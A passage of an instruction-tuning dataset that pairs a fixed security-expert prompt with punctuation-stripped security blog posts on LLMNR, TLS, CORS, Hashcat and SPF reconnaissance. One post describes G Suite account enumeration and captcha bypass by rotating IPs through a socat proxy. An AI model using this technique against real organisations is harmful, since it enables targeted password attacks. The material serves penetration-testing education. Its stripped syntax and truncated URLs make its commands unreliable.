        "output": "Bre Schumacher Many of you were probably asked as a young child what you wanted to be when you grew up Maybe you had an idea of something that sounded fun to you like being an astronaut or the mayor Perhaps you hadn't decided Maybe you still haven't decided Either way I'm guessing as a child the thought never crossed your mind that you'd be working in information security someday Or maybe it did For those of you just starting out in this field I thought I'd ask a few of our Black Hills Information Security testers what they wish they would have known when they were in your shoes They say hindsight is 20 20 and people can truly be some of your greatest resources so hopefully you'll take some of this to heart Here's what they had to say I wish I would have known how valuable development skills would be in this line of work I would have worked harder to maintain my coding chops Sally I wish I would have realized how important it was to speak at conferences share my research and give back to the community I always felt like I didn't have anything 'share-worthy but that kind of thinking was a result of me comparing myself to those who I looked up to instead of realizing I do belong and can help others Mike Personally I wish that I understood some of the fundamental concepts of coding when I started Networking and infrastructure background is a very important piece of the information security puzzle but...understanding system operations from Assembly C C Java and on upward through the coding system stack to Python sure would have been nice I started with Python and am working my way down the stack which has been fun but is very challenging Jordan And finally one more important thing to consider I wish I had known that you could take it in small pieces really that there's no other way to do it It's taken me years to accept that there will always be a ton of things I don't know and that the best way to grow is to build on what I do know There's never time to build that perfect lab but I can always make time to try a new thing when an opportunity comes up BB King For those of you who are a few years in feel free to join in on Twitter and share what you wish you had known too We'd love to hear what other bits of advice you have If you'd like to chat with us in person check out our events page to see what conferences we'll be at including Wild West Hackin Fest"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Disable LLMNR & Why You Want To</title>\n<taxonomies>Author, Blue Team, How-To, Kent Ickler, Active Directory, AD, AD Best Practices, Best Practices, Kent Ickler, Link Layer Multicast Name Resolution, LLMNR, network</taxonomies>\n<creation_date>Thu, 07 Jun 2018 13:58:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler Link-Local Multicast Name Resolution LLMNR This one is a biggie and you've probably heard Jordan John me and all the others say it many many times LLMNR was is a protocol used that allowed name resolution without the requirement of a DNS server It was is able to provide a hostname-to-IP based off a multicast packet sent across the network asking all listening Network-Interfaces to reply if they are authoritatively known as the hostname in the query It does this by sending a network packet to port UDP 5355 to the multicast network address all layer 2 You into RFC's Me too ools.ietf.org html rfc4795 The Impersonator What if you configure a node on the network to authoritatively say that it is no matter what the query exactly who the query is looking for Let's call this evil node I'mEveryoneNotReally This creates a race-condition for the client The client who is requesting the information will accept and wholly trust whoever answers first as the authoritative answer because based on the protocol specifications the only responses it should receive are authoritative and trustworthy The Hash Harvester Windows other operating systems too will use LLMNR in certain circumstances to identify certain machines on the network such as file-servers If Windows attempts to use LLMNR to identify the server of a file-share and it receives a reply it will send the current user's credentials directly to that server assuming it wouldn't have replied if it wasn't the authoritative file-server If that LLMNR received response was actually an impersonator I'mEveryoneNotReally Windows just disclosed that user's credential hash to a third-party What's worse The impersonator may forward that packet to the actual file-server so the user never realizes anything is amiss Do we even need LLMNR It was useful back in the day when DNS servers required costly processing power and system admins didn't want them in every subnet still don't AdHoc networks can benefit greatly from them as well but AdHoc networks are pretty uncommon these days It made sense for quick resolution of names that were on the same subnet Problem is hackers realized the protocol didn't have effective protections to prevent unauthorized nodes from authoritatively claiming they were anyone everyone That said in almost all cases LLMNR is no longer needed because proper DNS is configured Disabling LLMNR closes a very serious risk vector Disclaimer I've got 99 problems LLMNR isn't one You are responsible for doing your own research in this matter and making the decision for what works best for your organization If disabling this breaks stuff try to un-disable it and fix what broke In my opinion this is legacy protocol and presents enough risk that you are better to make whatever breaks work without LLMNR enabled Disable LLMNR with Active Directory GPO Active Directory has a GPO you can configure to prevent its domain workstations from using LLMNR Create a New or Update an existing Group Policy and Edit accordingly Computer Configuration Administrative Templates Network DNS ClientEnable Turn Off Multicast Name Resolution policy by changing its value to Enabled See screenshots below essentially this operation is the same as using the Local Security Policy editor with exception of making the modification on a Group Policy Disable LLMNR with Local Group Policy Windows 7 8 10 Pro Use Local Group Policy editor by running gpedit.msc and modifying the policy Computer Configuration Administrative Templates Network DNS ClientEnable Turn Off Multicast Name Resolution policy by changing its value to Enabled Disable LLMNR with Command Line Single Workstation Windows 7 8 10 Home Run these guys from command line REG ADD HKLM Software policies Microsoft Windows NT DNSClient REG ADD HKLM Software policies Microsoft Windows NT DNSClient v EnableMulticast t REG_DWORD d 0 f Disable LLMNR on Linux Ubuntu Edit the line LLMNR yes to LLMNR no in etc systemd resolved.conf nano etc systemd resolved.conf Reboot Links RFC 4795 ools.ietf.org html rfc4795 How to benefit from Link-Local Multicast Name Resolution logs.technet.microsoft.com networking 2008 04 01 how-to-benefit-from-link-local-multicast-name-resolution Vulnerability in DNS Resolution Could Allow Remove Code Execution ocs.microsoft.com en-us security-updates securitybulletins 2011 ms11-030 Black Hills Information Security Links LLMNR Blog Posts ww.blackhillsinfosec.com ?s LLMNR Active Directory Blog Posts ww.blackhillsinfosec.com ?s Active Directory"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Finding: Server Supports Weak Transport Layer Security (SSL/TLS)</title>\n<taxonomies>Author, David Fletcher, Finding, encryption, Secure Sockets Layer, SSL, TLS, Transport Layer Security, Web</taxonomies>\n<creation_date>Thu, 14 Jun 2018 13:32:01 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher The following blog post is meant to expand upon the findings commonly identified in BHIS reports The Server Supports Weak Transport Layer Security SSL TLS is almost universal across the breadth of our testing Why is this finding important This finding is important because attackers are ultimately interested in data Use of a strong SSL TLS configuration provides identification authentication confidentiality and integrity services to the application or protocol that is using it If weak protocols and ciphers are supported then an attacker may be able to break the encrypted tunnel that exists between the client and server After this occurs the attacker might impersonate one of the communicating endpoints slurp up unencrypted information or modify that information in transit While attacking SSL TLS might be difficult and time consuming if it were impossible we wouldn't have retired entire protocols like SSLv2 SSLv3 TLS 1.0 by 30 June 2018 for PCI compliance We also wouldn't have had these over the years From Left to Right Heartbleed Drown and SSL POODLE Vulnerability Logos Given the time constraints placed on a penetration test and conflicts with other goals and outcomes of the test it's unlikely that we will have done anything more than confirmed the results of Nessus using an additional tool So why should you care You should care because the use of SSL TLS is typically one of the only protections that keeps communication between a client and server whether by a customer or employee private It also can provide authentication and integrity checking Even the most trivial communication can include sensitive information or the ability to generate sensitive information as a side effect like authentication hashes As a result it's best to just keep your SSL TLS configuration up to date by patching and disabling support for weak protocols and ciphers What should you do about it In a corporate Active Directory environment making these changes can be simple Active Directory Group Policy can be used to disable weak ciphers and protocols and to set the cipher preference across the breadth of your Windows computers clients and servers Obviously implementing a change like this should be accomplished incrementally to ensure that client connection and SSL TLS negotiation failures do not occur In addition to implementing the change in Group Policy we also recommend that you change the settings in your default client image to ensure that devices cannot use insecure protocols or ciphers by default Additional configuration may be necessary for specific Active Directory infrastructure systems to completely disable support for weak protocols and ciphers Similar automation capabilities can be found for Linux Linux-like and Unix devices using automation frameworks like Puppet As with Windows systems these changes should be integrated into the baseline procedures for these operating systems as well Don't forget those mobile devices too The area where you are likely to have the slowest progress is with embedded systems printers storage devices point of sale hardware etc and vendor appliances If you have a homogeneous print environment you might be in luck because some vendors support mass firmware upgrades for cases like this However a better strategy might be segmentation and access control lists or firewalls to prevent devices and their communication from being accessible to an attacker in the first place What constitutes weak and strong From a protocol perspective your best bet is to disable support for anything short of TLS 1.2 if you can With regard to cipher suites and general configuration options the following post by Ivan Ristic from Qualys SSL Labs contains all of the details you could want ithub.com ssllabs research wiki SSL-and-TLS-Deployment-Best-Practices Conclusion On most modern hosts correction of SSL TLS issues isn't a monumental task Care does have to be taken to ensure that service degradation is avoided on especially sensitive systems You can also take alternative approaches for systems that you don't have the time or resources to address as well We haven't identified an exhaustive list but thinking about isolating those systems from the rest of the herd should get your creative juices flowing And if all else fails...you can just do this ww.ibm.com support knowledgecenter en SSFKSJ_7.5.0 com.ibm.mq.sec.doc q009940_.htm ocs.vmware.com en VMware-Horizon-7 7.1 com.vmware.horizon-client-agent.security.doc GUID-FC2EB030-4D0F-4AA6-9273-0F14A67ADC73.html upport.microsoft.com en-us help 4040243 how-to-enable-tls-1-2-for-configuration-manager upport.microsoft.com en-us help 245030 how-to-restrict-the-use-of-certain-cryptographic-algorithms-and-protoc ww.ssllabs.com ssltest ttpd.apache.org docs 2.4 ssl ssl_howto.html aymii.org s tutorials Strong_SSL_Security_On_nginx.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hashcat 4.10 Cheat Sheet v 1.2018.1</title>\n<taxonomies>Author, External/Internal, How-To, Informational, InfoSec 201, Kent Ickler, Password Cracking, Wireless, Cheat Sheet, Cracking, dictionary, Hashcat, Hashing, Jordan Drysdale, Password cracking</taxonomies>\n<creation_date>Fri, 15 Jun 2018 14:51:04 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler It seemed like we were always cross-referencing the Hashcat Wiki or help file when working with Hashcat We needed things like specific flags hash examples or command syntax We've generated a Hashcat Cheat Sheet for quick reference that may save you a bunch of time if you're often reaching out to the Wiki or Helpfile We welcome feedback too we want to give back to the InfoSec community If you have suggestions for this cheat sheet let us know BHInfoSecurity Take a look and keep it handy ww.blackhillsinfosec.com wp-content uploads 2020 09 HashcatCheatSheet.v2018.1b.pdf BHIS Links Hashcat Blog Posts ww.blackhillsinfosec.com ?s hashcat External Links Hashcat ashcat.net hashcat GitHub ithub.com hashcat hashcat Crackstation rackstation.net"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>CORS Lite</title>\n<taxonomies>Informational, Web App, CORS, Cross Origin Request Sharing, Web App</taxonomies>\n<creation_date>Thu, 21 Jun 2018 13:30:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson Cross Origin Request Sharing CORS is complicated and that complexity creates a lot of places where security vulnerabilities can sneak in This article will give you a lite overview of CORS with a focus on security vulnerabilities that we see most frequently on tests This isn't intended to be a full CORS primer if you're interested in really diving in there's a resources section at the end that will help you get started CORS has many facets so let's cover a few of the more common cases one by one and see what can go wrong The most basic part of the CORS specification is the Access-Control-Allow-Origin header the basis around which everything else is built This header informs the browser what origins are allowed to access a particular resource Put another way if the JavaScript in your webapp which the user's browser loaded at app.example.com makes a request to api.example.com that request is cross-origin and by default will be denied i.e the browser won't issue the request or will ignore the result from the request unless api.example.com returns an Access-Control-Allow-Origin header telling the browser that it's ok In all the following images the big green thumbs-up means the scenario was a success and happened and the big red thumbs-down means the browser refused to carry out the scenario though it might not refuse until partway through CORS is complicated and I'm skimming over some stuff here For something like an API the Access-Control-Allow-Origin header is frequently set to which allows any domain to make cross-origin requests to the API This means any javascript anywhere can access your API Thankfully though even with an Access-Control-Allow-Origin header cross-origin requests won't transmit cookies or other authentication material so this header by itself is actually fairly safe The Access-Control-Allow-Origin header doesn't usually open up security problems on its own but it can make other problems much worse when it's added The big risk comes with the addition of another CORS header Access-Control-Allow-Credentials When this header is returned cross-origin requests are allowed to include cookies and other authentication material This is where problems really begin If a user visits example.com and example.com sets a cookie in their browser say after they log in the Access-Control-Allow-Credentials header will allow that cookie to be sent by requests issued by that same browser from other domains That means those domains can use cookies set by example.com to carry out actions on example.com no matter who controls the javascript running on those domains If a request to example.com returns an Access-Control-Allow-Origin foo.bar header and an Access-Control-Allow-Credentials true header then any scripts on foo.bar execute with privileges as if they were native scripts on example.com This means that XSS vulnerabilities on foo.bar are equivalent to XSS vulnerabilities on example.com If you're the owner of example.com that's a lot of trust to place in the owner of another site and you should think about it very carefully before you do There are a couple of protections in place to prevent accidents around the Access-Control-Allow-Credentials header because it's so dangerous For one it cannot be combined with Access-Control-Allow-Origin Some sites get around this by just reflecting back whatever is sent in the Origin header in the Access-Control-Allow-Origin header in their response bypassing this restriction If you ever contemplate doing such a thing please think very carefully about the risk you're taking on before you do Another restriction on the Access-Control-Allow-Credentials header is on the client side XMLHttpRequests must deliberately set a withCredentials flag in order to request that credentials be sent to make sure you absolutely want the browser to send cookies and other sensitive material with your cross-domain request These protections are kind of confusing so I've set up a grid below that shows the different scenarios you may find yourself in Along the left you can see the headers returned by the server while along the top you can see whether the client javascript set the withCredentials flag Any red box means the request was entirely denied by the browser for instance the first two rows are entirely red because cross-domain requests aren't allowed without the Access-Control-Allow-Origin header In the boxes themselves you can see whether cookies were sent by the client If you'd like to play with this more and see the exact code that created this grid you can run this example yourself go grab it from Github at ithub.com DakotaNelson cors-test-server Here's the main takeaway though if you're reflecting the Origin header into your Access-Control-Allow-Origin header and setting Access-Control-Allow-Credentials true at the same time any attacker able to execute malicious javascript in one of your users browsers no matter where that javascript is can hijack that user's cookies set by your application and act on that user's behalf If there's an XSS vulnerability in a site they commonly visit the attacker is able to execute javascript in an advertisement targeted to them or the attacker can execute javascript after phishing the user to an attacker-controlled page it's game over if that user has a session on your application Some applications attempt to split the difference and validate the origin header manually instead of just reflecting it so that e.g anything matching .example.com is considered safe and will be returned in the Access-Control-Allow-Origin header Do you see the problem here An attacker who can convince a user to visit example.com.malicious.com likely through phishing can conduct the same attacks as before because that site matches the pattern This is still better than reflecting back any arbitrary origin in the Access-Control-Allow-Origin header but as always validation is very tricky to get right There are other twists and turns to CORS and headers we haven't covered but the key that you need to understand is this CORS is complicated and any time you're considering doing anything with it it's worth doing some research into the implications The resources below are things I've found useful in understanding the security implications of CORS and if you're the hands-on type you should definitely set up the CORS test server and poke at it for a while to help you understand what's going on Good luck and I hope you enjoyed this CORS lite Other resources n.wikipedia.org wiki Cross-origin_resource_sharing eveloper.mozilla.org en-US docs Web HTTP CORS ortswigger.net blog exploiting-cors-misconfigurations-for-bitcoins-and-bounties eb-in-security.blogspot.com 2017 07 cors-misconfigurations-on-large-scale.html"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Running HashCat on Ubuntu 18.04 Server with 1080TI</title>\n<taxonomies>Author, Derrick Rauch, How-To, Kent Ickler, Password Cracking, Red Team, Cracking, GPU, Hash, Hashcat, NVidia, password, Red Team, setup, Ubuntu</taxonomies>\n<creation_date>Mon, 25 Jun 2018 15:33:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derrick Rauch and Kent Ickler Updated 3 22 2019 First to see what our build looks like look here ww.blackhillsinfosec.com build-password-cracker-nvidia-gtx-1080ti-gtx-1070 What's next Time for System Rebuild First you need to decide whether you need encryption LVM RAID multipath network VLANs or network interface bonding during the installation if you need to reuse existing partitions on your installation disks The reason I bring these up is the main Ubuntu image offered does not include these options so be careful what one you download Here is the link to the option that will have these dimage.ubuntu.com releases 18.04 release Installing Ubuntu 18.04 Next run through the Ubuntu installer we are going to assume you already know how to do this Note there is no need to install any of the package options during the installation process Once the machine is running go ahead and log in Configure GPU Support Then you will blacklist Nouveau generic Nvidia driver as it conflicts with card-specific Nvidia drivers with the following commands sudo bash -c echo blacklist nouveau etc modprobe.d blacklist-nvidia-nouveau.conf sudo bash -c echo options nouveau modeset 0 etc modprobe.d blacklist-nvidia-nouveau.conf sudo update-initramfs -u sudo reboot Now that the system is up and you are logged in again add 32 bit headers for parts of the Nvidia driver setup sudo apt-get install makesudo apt-get install gcc We are now ready to install NVidia drivers Browse to site and enter info for your device ww.nvidia.com Download index.aspx Search and then click download then click agree download jeez we were sure the first time NVidia If you are not on the local system you can right-click the 'agree download button and 'copy link then run the below command to download it no quotes needed wget pastelinkhere Now that you have your driver downloaded from the same directory it is located in run the following cmd sudo NVIDIA .run Accept all defaults during the Nvidia install and make sure that it is on YES for updating x config xorg.conf Then you will reboot sudo reboot Download Install Hashcat After it is back up grab haschat from ashcat.net hashcat If no gui use wget Paste link here Once downloaded unzip it P7zip -d hashcat Now you're ready to run hashcat and start cracking Well maybe Additional Considerations With everything above keep in mind hardware differences and length of use For example the 1080TI Founders edition GPUs have a 91C BIOS thermal throttle but hashcat will stop at 90C causing it to thermal stop at times without using some additional switches with hashcat so you may have to tweak settings depending on your setup BHIS Links Hashcat Blog Posts ww.blackhillsinfosec.com tag hashcat GPU Cracker Build ww.blackhillsinfosec.com build-password-cracker-nvidia-gtx-1080ti-gtx-1070 External Links NVidia Drivers ww.nvidia.com Download index.aspx Hashcat ashcat.net hashcat Hashcat Git-Repo ithub.com hashcat hashcat"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Offensive SPF: How to Automate Anti-Phishing Reconnaissance Using Sender Policy Framework</title>\n<taxonomies>Author, Blue Team, How-To, Kent Ickler, Phishing, Anti-Phising, Best Practices, Blue Team, DKIM, DMARC, Email, Filtering, Incident Response, IR, Kent Ickler, Marketing, phishing, reconnaissance, RFC 4408, Sender Policy Framework, Spam, SPF</taxonomies>\n<creation_date>Thu, 28 Jun 2018 17:14:46 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler TL DR This post describes the process of building an active system to automatically recon SPF violations Disclaimer There are parts of this build that might not be legal in your area Use in the wild at your own risk Discuss with your peeps before implementing BHIS Krelkci are not liable for your actions Background In our previous blog post about configuring SPF I didn't elaborate on the awesomeness of the exist and reason mechanics What little people outside of SPF experts know is that you can build a system of response automation around the use of these two mechanics Like to read Syntax RFC 4408 ww.openspf.org RFC_4408 The exists mechanic will force a compliant receiving mail server to check if a specific A DNS record exists for a specific domain While that seems interesting and all what perhaps is more important is the use of SPF macros within the exists mechanic It essentially allows you to pass information about the originating SMTP server from the receiving SMTP server to wherever the domain owner of the domain in the envelope's FROM field determines How you say Let's look at this SPF record v spfc1 include mail.youdomain.com -exists d .AutoRecon.yourdomain.com -all The receiving SMTP server does the following actions Receive from originating mail server where the FROM field domain Check SPF record for mail.yourdomain.com of origin server is found Good else move on Check if an A DNS record exists for ORIGINATING.MAIL.SERVER.NAME .autorecon.yourdomain.com Kill everything else -all Here are the key points If mail is delivered from a server that doesn't exist within the SPF headers of mail.yourdomain.com the receiving mail server is going to attempt to check an alias record for a dynamic hostname that is built on the fly All you have to do now is build a DNS server configured to accept DNS queries for .autorecon.yourdomain.com and provide all queries to an auto-recon system and tell your global DNS provider that autorecon.yourdomain.com is authoritatively answered by your auto-recon service Let's do it On the AutoRecon Service Bind configured to accept queries for AutoSPF.yourdomain.com SSMTP configured to send mail Get the files cd opt git clone ithub.com Relkci AutoSPFRecon apt-get install bind9 apt-get install logtail apt-get install python-setuptools easy_install clic easy_install shodan Setup your BIND9 Domain -named.conf nano etc bind named.conf zone autorecon.YOURDOMAIN.com type master notify no file etc bind AutoRecon.yourdomain.com Setup your BIND9 Domain zone file nano etc bind autospf.yourdomain.tld TTL 3D IN SOA autorecon.ns.yourdomain.com admin yourdomain.com 199802151 serial todays date todays serial 21600 refresh seconds 3600 retry seconds 604800 expire seconds 30 minimum seconds NS ns Inet Address of name server localhost A 127.0.0.1 ns A IP-OF-AutoRecon Restart Bind Service bind9 restart Service bind9 status Configure Bind to log DNS queries to var log syslog below command toggles query logging be sure it is enabled rdnc querylog confirm it is turned on with tail -n 2 var log syslog Setup your Domain DNS records CAUTION Setting the SPF RECORD AS BELOW WILL TELL ALL MAIL SERVERS TO REJECT YOUR EMAIL You can use ?exists autospf.yourdomain.tld mechanic which will not immediately reject email Be sure you retain the proper parts of SPF so that you do not reject all email The below example would be appropriate for a domain that should never send email See our blog post on SPF Records to create a proper SPF record for your organization On your TLD nameserver Type A Host autorecon.ns.yourdomain.com Value IP-OF-AutoReconType NS Host autorecon.yourdomain.com Value autorecon.ns.yourdomain.comType TXT Host Value v spf1 -exists i .autorecon.yourdomain.com -all Putting it all together When a mail server receives email and the originating mail server reviews the SPF record and finds it cannot find the mail server in an include or other mail record it will continue until it finds the exists i .autorecon.yourdomain.com which will instruct it to replace the i with the IP of the server originating the email The server will lookup the NS record for autorecon.yourdomain.com and find that it is the autorecon.yourdomain.com service It will query IP .autorecon.yourdomain.com and will not receive a valid DNS response The Bind server on autorecon.yourdomain.com however will have logged the query in var log syslog The AutoReconSPF.sh script reads the syslog for those queries runs a shodan query and then delivers the results to an email address in question The AutoReconSPF.sh script can be configured to run every few minutes with crontabs What Else Can it do This proof of concept script sets the framework in a compartmentalized and easy to edit way You can add your own script actions such as NMAP scans IR events or maybe even link it back to Fail2Ban or IPTable black-lists Expand NMap Fail2Ban IPTables Incident Response Automate Lights Out Someone attempts to phish your staff with an email forged to be from your domain Since your SPF records fail to authorize the originating mail server your AutoSPFRecon system gets alerted and triggers an email Fail2Ban blockade and immediately the phishing server's visibility into your infrastructure goes immediately dark Running AutoReconSPF.sh In this test I have sent an email forged with a domain that had the AutoReconSPF SPF records The email was sent from a Digital Ocean droplet at 206.189.xxx.xxx The receiving mail server sends a query to autospf.bhis.io and the log entry is created AutoReconSPF.sh identifies the offending mail server's IP to shodan and sends the results to me in email Awesome Resulting Email Delivered Links GitHub ithub.com Relkci AutoSPFRecon RFC SPF that includes exists mechanic ww.openspf.org RFC_4408 BHIS SPF for the Masses Blog Post ww.blackhillsinfosec.com how-to-configure-spfv1-explained-for-the-masses"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Free Ticket to the Most Hands-on Infosec Con</title>\n<taxonomies>Fun & Games, Wild West Hackin' Fest</taxonomies>\n<creation_date>Tue, 03 Jul 2018 13:20:38 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "For the entire month of June we ran a contest on our Twitter with the grand prize being a free ticket to Wild West Hackin Fest We were quick to allow a BHIS sticker or a book in place of a t-shirt as well Before we get to the winner for those of you who are unfamiliar with Wild West Hackin Fest we'll give you a quick overview WHO Anyone interested in information security from the n00bs to the pros WHERE Deadwood SD Never been It's awesome WHEN Thursday Friday October 25-26 WHY We want this conference to be the most hands-on activity-driven con you've been to yet Never worked with a JTAG You will Never done a single thing with Software Defined Radio You will We will be having an SDR village and a hardware hacking village among some other great events The skills you learn here will be directly applicable to your job immediately when you get back to work or home We listened to your feedback and this year we're adding even more lab time so you can go to as many talks as you can fit AND also do all the activities You can find out more information and even purchase your ticket here ww.wildwesthackinfest.com Now for the winner Congrats Brian And thank you to everyone who entered Hopefully we'll see you all at Wild West Hackin Fest this fall"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>G Suite is the Soft Underbelly of Your Environment</title>\n<taxonomies>Red Team, G Suite, gmail</taxonomies>\n<creation_date>Thu, 19 Jul 2018 14:02:43 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Matthew Toussain Wouldn't you like to START your pentests knowing every username for all individuals in your target environment Gmail G Suite Outlook Web Access Exchange Web Services Email A divine gift issued to hackers with no statute of limitations In this blog we explore an exploitation workflow using new features of the MailSniper toolkit What happens if you browse to mail.google.com and trying logging in as matt blackhillsinfosec.com It turns out that Google automatically attempts to authenticate you to a G Suite instance associated with the domain blackhillsinfosec.com Since BHIS has one this works What happens if instead you tried logging on as blahblah blackhillsinfosec.com No dice interesting As you can see from the above image Google responds differently to email accounts that exist versus those that do not It performs this check without even attempting authentication In our role as penetration testers this information response is exceptionally useful It means that we can discover valid user emails without knowing ANYTHING except the domain name There is however one pesky problem Captchas After a few unsuccessful attempts Google presents us with a captcha to verify our humanity Fortunately for us humanity can be scripted As with everything in information security overcoming a hurdle is just a matter of diving deeper In this case we turn to the wire If differences in error responses is what allows us to determine whether an account exists what would be indicated by differences in responses when a captcha is presented That's right captcha no captcha We can look for these differences with the Burp Suite intercepting proxy In Burp Suite we can see a get request for captcha but what is most interesting to use is the return response to our POST requests A POST request is made for each email lookup request As you can see a captcha was requested after the sixth consecutive bad POST request Comparing this response to an incorrect but captcha-less response we can key in on the gf.alr JSON name value pair The value of this object changes For every captcha the ALR value is a 5 whereas each bad email request returns a 7 Bypassing captchas could be as simple as detecting an ALR of 5 and retrying until an ALR of 7 is received again When we examine many responses across a wide number of request response types we can see that this differentiation remains constant yet predictable 1 Correct Email Address 7 Incorrect Email Address 5 Captcha Presented There are even other factors like 2FA that can be enumerated using this mechanism Awesome That said waiting for captchas to go away is lame What else could we try When we detect a captcha what happens if we send the next request from a different IP address No captcha Using _socat_ we can setup socks proxy hosts to bounce and rotate our guesses socat TCP-LISTEN 9090 fork SOCKS4A 127.0.0.1 accounts.google.com 443 socksport 9999 If we combine all of these features and create a list of potential email addresses we can enumerate users Let's look at an example of this performed against BHIS What if we do not know the email addresses ahead of time With some clever scripting an US Census data we can overcome this limitation Emails generally come in one of several overarching formats Format Example firstname domain.com matt blackhillsinfosec.com firstname.lastname domain.com matthew.toussain blackhillsinfosec.com firstinitial.lastname domain.com mtoussain blackhillsinfosec.com By taking the top 1000 boy and girl names from census data and combining them with the most common US surnames we can generate email address permutations Next let's examine this accomplished with PowerShell First download a list of firstnames and lastnames PS C git clone ithub.com 0sm0s1z email-generator.git PS C cd email-generator Now use PowerShell to craft a custom email list based on the desired format Get-Content firstnames.txt fname _ Get-Content lastnames.txt fname _ blackhillsinfosec.com Email is a key component of the penetration tester's toolkit This will continue as long as password-based authentication remains the gatekeeper of system or network security The fundamental problem here is not necessarily Gsuite or Outlook Online though there is certainly more they can do The primacy of passwords unshackles the network adversary As penetration testers we need to demonstrate these problems to engender a more secure future for us all ____________________________________________________________________ This blog post is a follow up to Matt's webcast which is available to watch here ww.blackhillsinfosec.com webcast-testing-g-suites-with-mailsniper"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Scout2 Usage: AWS Infrastructure Security Best Practices</title>\n<taxonomies>Author, Blue Team, How-To, Jordan Drysdale, Amazon Web Services, AWS, Best Practices, Blue Team, Jordan Drysdale, Scout2</taxonomies>\n<creation_date>Mon, 23 Jul 2018 14:44:56 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
